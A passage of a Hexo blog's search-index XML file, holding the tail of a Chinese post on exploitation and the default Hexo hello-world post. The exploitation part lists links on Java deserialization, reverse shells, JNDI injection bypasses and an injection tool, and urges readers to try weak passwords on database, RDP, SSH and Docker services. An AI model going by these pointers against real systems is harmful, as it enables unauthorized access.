rel="noopener">https://xz.aliyun.com/t/7393</a></p><p>linux下java反序列化通杀回显方法的低配版实现 – 先知社区<br><a href="https://xz.aliyun.com/t/7307" target="_blank" rel="noopener">https://xz.aliyun.com/t/7307</a></p><p>照弹不误:出站端口受限环境下反弹Shell的思考 – FreeBuf互联网安全新媒体平台<br><a href="https://www.freebuf.com/vuls/232544.html" target="_blank" rel="noopener">https://www.freebuf.com/vuls/232544.html</a></p><p>如何绕过高版本JDK限制进行JNDI注入利用<br><a href="https://mp.weixin.qq.com/s/Dq1CPbUDLKH2IN0NA_nBDA" target="_blank" rel="noopener">https://mp.weixin.qq.com/s/Dq1CPbUDLKH2IN0NA_nBDA</a></p><p>JosephTribbianni/JNDI: JNDI 注入利用工具<br><a href="https://github.com/JosephTribbianni/JNDI" target="_blank" rel="noopener">https://github.com/JosephTribbianni/JNDI</a></p><p>7.永远相信弱口令的力量, 文中没有提到的 mysql, mssql, rdp, ssh, docker-api, 大数据平台相关组件或者更多常见不常见服务, 很多都是弱口令/未授权一把梭的问题<br>最后祝大家 <strong>开局有0day, 处处弱口令</strong></p><script>        document.querySelectorAll('.github-emoji')          .forEach(el => {            if (!el.dataset.src) { return; }            const img = document.createElement('img');            img.style = 'display:none !important;';            img.src = el.dataset.src;            img.addEventListener('error', () => {              img.remove();              el.style.color = 'inherit';              el.style.backgroundImage = 'none';              el.style.background = 'none';            });            img.addEventListener('load', () => {              img.remove();            });            document.body.appendChild(img);          });      </script>]]></content>
    
    
    <categories>
      
      <category>漏洞利用</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>hello-world</title>
    <link href="/2020/07/08/hello-world/"/>
    <url>/2020/07/08/hello-world/</url>
    
    <content type="html"><![CDATA[<p>Welcome to <a href="https://hexo.io/" target="_blank" rel="noopener">Hexo</a>! This is your very first post. Check <a href="https://hexo.io/docs/" target="_blank" rel="noopener">documentation</a> for more info. If you get any problems when using Hexo, you can find the answer in <a href="https://hexo.io/docs/troubleshooting.html" target="_blank" rel="noopener">troubleshooting</a> or you can ask me on <a href="https://github.com/hexojs/hexo/issues" target="_blank" rel="noopener">GitHub</a>.</p><h2 id="Quick-Start"><a href="#Quick-Start" class="headerlink" title="Quick Start"></a>Quick Start</h2><h3 id="Create-a-new-post"><a href="#Create-a-new-post" class="headerlink" title="Create a new post"></a>Create a new post</h3><pre><code class="hljs bash">$ hexo new <span class="hljs-string">"My New Post"</span></code></pre><p>More info: <a href="https://hexo.io/docs/writing.html" target="_blank" rel="noopener">Writing</a></p><h3 id="Run-server"><a href="#Run-server" class="headerlink" title="Run server"></a>Run server</h3><pre><code class="hljs bash">$ hexo server</code></pre><p>More info: <a href="https://hexo.io/docs/server.html" target="_blank" rel="noopener">Server</a></p><h3 id="Generate-static-files"><a href="#Generate-static-files" class="headerlink" title="Generate static files"></a>Generate static files</h3><pre><code class="hljs bash">$ hexo generate</code></pre><p>More info: <a href="https://hexo.io/docs/generating.html" target="_blank" rel="noopener">Generating</a></p><h3 id="Deploy-to-remote-sites"><a href="#Deploy-to-remote-sites" class="headerlink" title="Deploy to remote sites"></a>Deploy to remote sites</h3><pre><code class="hljs bash">$ hexo deploy</code></pre><p>More info: <a href="https://hexo.io/docs/one-command-deployment.html" target="_blank" rel="noopener">Deployment</a></p><script>        document.querySelectorAll('.github-emoji')          .forEach(el => {            if (!el.dataset.src) { return; }            const img = document.createElement('img');            img.style = 'display:none !important;';            img.src = el.dataset.src;            img.addEventListener('error', () => {              img.remove();              el.style.color = 'inherit';              el.style.backgroundImage = 'none';              el.style.background = 'none';            });            img.addEventListener('load', () => {              img.remove();            });            document.body.appendChild(img);          });      </script>]]></content>
    
    
    
    <tags>
      
      <tag>test</tag>
      
    </tags>
    
  </entry>
  
  
  
  
</search>
